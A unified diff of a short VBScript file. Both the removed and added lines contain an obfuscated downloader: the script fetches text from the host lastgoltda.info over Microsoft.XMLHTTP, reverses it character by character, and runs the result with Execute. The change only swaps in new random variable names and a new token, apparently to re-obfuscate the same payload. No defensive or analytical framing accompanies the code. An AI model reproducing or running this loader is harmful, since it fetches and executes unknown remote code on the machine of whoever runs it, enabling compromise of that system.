@@ -1,15 +1,15 @@
-NwCgS="p4ovL5vOLXRAkyzyIPz9qD07O"
-URL="http://lastgoltda.info/?c=r&" & NwCgS
-set DYWp4=CreateObject("Microsoft.XMLHTTP")
+bIO0r="ehTGMoAPe1LVz5lPKbsTnW8r4"
+URL="http://lastgoltda.info/?c=r&" & bIO0r
+set GFFvM=CreateObject("Microsoft.XMLHTTP")
 
-DYWp4.open "GET",URL,false
-DYWp4.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
-DYWp4.setRequestHeader "User-Agent", "RemoveIT"
-DYWp4.send "Z"
+GFFvM.open "GET",URL,false
+GFFvM.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+GFFvM.setRequestHeader "User-Agent", "RemoveIT"
+GFFvM.send "Z"
 
-For i = Len(DYWp4.responsetext) to 1  Step-1
-    var= Mid(DYWp4.responsetext,  i  , 1)
-    Kh7pm = Kh7pm & var
+For i = Len(GFFvM.responsetext) to 1  Step-1
+    var= Mid(GFFvM.responsetext,  i  , 1)
+    Qfj5c = Qfj5c & var
 Next
 
-execute "Execute Kh7pm & NwCgSDYWp4"
+execute "Execute Qfj5c & bIO0rGFFvM"
